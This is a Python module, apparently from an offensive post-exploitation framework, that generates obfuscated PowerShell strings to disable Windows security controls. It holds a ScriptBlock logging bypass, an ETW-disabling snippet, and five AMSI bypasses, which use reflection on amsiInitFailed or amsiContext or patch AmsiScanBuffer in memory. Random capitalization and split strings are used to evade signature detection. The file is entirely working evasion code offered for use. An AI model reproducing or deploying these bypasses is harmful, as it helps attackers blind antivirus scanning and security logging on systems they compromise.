from __future__ import absolute_import
from . import helpers


def scriptBlockLogBypass():
    # ScriptBlock Logging bypass
    bypass = helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("GPF")+"=[ref].Assembly.GetType(")
    bypass += "'System.Management.Automation.Utils'"
    bypass += helpers.randomize_capitalization(").\"GetFie`ld\"(")
    bypass += "'cachedGroupPolicySettings','N'+'onPublic,Static'"
    bypass += helpers.randomize_capitalization(");If($"+helpers.generate_random_script_var_name("GPF")+"){$"+helpers.generate_random_script_var_name("GPC")+"=$"+helpers.generate_random_script_var_name("GPF")+".GetValue($null);If($"+helpers.generate_random_script_var_name("GPC")+"")
    bypass += "['ScriptB'+'lockLogging']"
    bypass += helpers.randomize_capitalization("){$"+helpers.generate_random_script_var_name("GPC")+"")
    bypass += "['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;"
    bypass += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("GPC")+"")
    bypass += "['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}"
    bypass += helpers.randomize_capitalization("$val=[Collections.Generic.Dictionary[string,System.Object]]::new();$val.Add")
    bypass += "('EnableScriptB'+'lockLogging',0);"
    bypass += helpers.randomize_capitalization("$val.Add")
    bypass += "('EnableScriptBlockInvocationLogging',0);"
    bypass += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("GPC")+"")
    bypass += "['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']"
    bypass += helpers.randomize_capitalization("=$val}")
    bypass += helpers.randomize_capitalization("Else{[ScriptBlock].\"GetFie`ld\"(")
    bypass += "'signatures','N'+'onPublic,Static'"
    bypass += helpers.randomize_capitalization(").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}")
    return bypass

def ETWBypass():
    #tandasat killetw.ps1
    bypass = """
    [System.Diagnostics.Eventing.EventProvider]."GetFie`ld"('m_e'+'nabled','Non'+'Public,'+'Instance').SetValue([Ref].Assembly.GetType('Syste'+'m.Management.Automation.Tracing.PSE'+'twLogProvider')."GetFie`ld"('et'+'wProvider','NonPub'+'lic,S'+'tatic').GetValue($null),0);
    """
    return bypass

def AMSIBypass():
    # @mattifestation's AMSI bypass
    bypass = helpers.randomize_capitalization("$Ref=[Ref].Assembly.GetType(")
    bypass += "'System.Management.Automation.Amsi'+'Utils'"
    bypass += helpers.randomize_capitalization(');$Ref.GetField(')
    bypass += "'amsiInitF'+'ailed','NonPublic,Static'"
    bypass += helpers.randomize_capitalization(").SetValue($null,$true);")
    return bypass.replace('\n','').replace('    ', '')



def AMSIBypass2():
    # Modified implementation of Tal Liberman's AMSI bypass 
    bypass = """
    $MethodDefinition = @"
    
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
        [DllImport("kernel32")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    "@;

    $Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
    $ABSD = 'AmsiS'+'canBuffer';
    $handle = [Win32.Kernel32]::GetModuleHandle('amsi.dll');
    [IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, $ABSD);
    [UInt32]$Size = 0x5;
    [UInt32]$ProtectFlag = 0x40;
    [UInt32]$OldProtectFlag = 0;
    [Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag);
    $buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3);

    [system.runtime.interopservices.marshal]::copy($buf, 0, $BufferAddress, 6); 
    """
    bypass = bypass.replace('"kernel32"', '`"kernel32`"')
    bypass = bypass.replace('@"','"')
    bypass = bypass.replace('"@','"')
    bypass = bypass.replace('\n','')
    bypass = bypass.replace('    ', '')
    
    return bypass

def AMSIBypass3():
    # Forcing error
    bypass = """
    $var = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076);
    [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession", "NonPublic,Static").SetValue($null, $null);
    [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext", "NonPublic,Static").SetValue($null, [IntPtr]$var);;
    """

    return bypass

def AMSIBypass4():
    # Using Matt Graebers Reflection method with WMF5 autologging bypass
    bypass = """
    [Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('System.Reflection.BindingFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.Type')), [Object]([Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")),('GetField')).Invoke('amsiInitFailed',(("NonPublic,Static") -as [String].Assembly.GetType('System.Reflection.BindingFlags'))).SetValue($null,$True);";
    """

    return bypass

def AMSIBypass5():
    # Using Matt Graebers second Reflection method
    bypass = """
    [Runtime.InteropServices.Marshal]::("WriteInt32")([Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext",[Reflection.BindingFlags]"NonPublic,Static").GetValue($null),0x" + random.Next(0, int.MaxValue).ToString("X") + ");";
    """
    
    return bypass
